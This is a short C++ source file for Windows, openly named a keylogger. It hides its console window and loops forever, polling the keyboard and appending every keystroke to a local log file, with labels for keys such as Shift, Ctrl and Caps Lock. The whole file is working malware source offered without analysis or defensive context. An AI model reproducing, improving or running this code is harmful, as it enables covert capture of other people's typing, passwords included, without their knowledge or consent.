#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <bits/stdc++.h>

//Log file path
#define LOG_FILE "keylogger.txt"

//Save data to file
void saveData(std::string data){
	std::fstream keylog;
	keylog.open(LOG_FILE, std::ios::app); //Append to file so logs are not cleared
	keylog << data;
	keylog.close();	
}

//Translate special characters. Only works for Windows now
std::string translateKey(int key){
	std::string result = "";

	switch (key) {
	case VK_SPACE:
		result = " ";
		break;
	case VK_RETURN:
		result = "\n";
		break;
	case VK_BACK:
		result = "\b";
		break;
	case VK_CAPITAL:
		result = "[CAPS_LOCK]";
		break;
	case VK_SHIFT:
		result = "[SHIFT]";
		break;
	case VK_TAB:
		result = "\t";
		break;
	case VK_CONTROL:
		result = "[CTRL]";
		break;
	case VK_MENU:
		result = "[ALT]";
		break;
	default:
		break;
	}

	return result;
}

int main (void){

	int specialKeys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
	std::string specialChar;
	bool isSpecial;

	//Hide terminal
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	//Loop forever
	while (true) {
		for (int key = 8; key <= 190; key++) {
			//Check for keypress
			if (GetAsyncKeyState(key) == -32767){
				isSpecial = std::find(std::begin(specialKeys), std::end(specialKeys), key) != std::end(specialKeys);
				//Special key
				if (isSpecial){
					specialChar = translateKey(key);

					saveData(specialChar);
				}
				//Normal key
				else {
					if (GetKeyState(VK_CAPITAL)){ //Caps lock
						saveData(std::string(1, (char) key));
					}
					else {
						saveData(std::string(1, (char) std::tolower(key)));
					}
				}
				
			}

		}
	}

	std::cout << "Hello Windows" << std::endl;
	return 0;
}
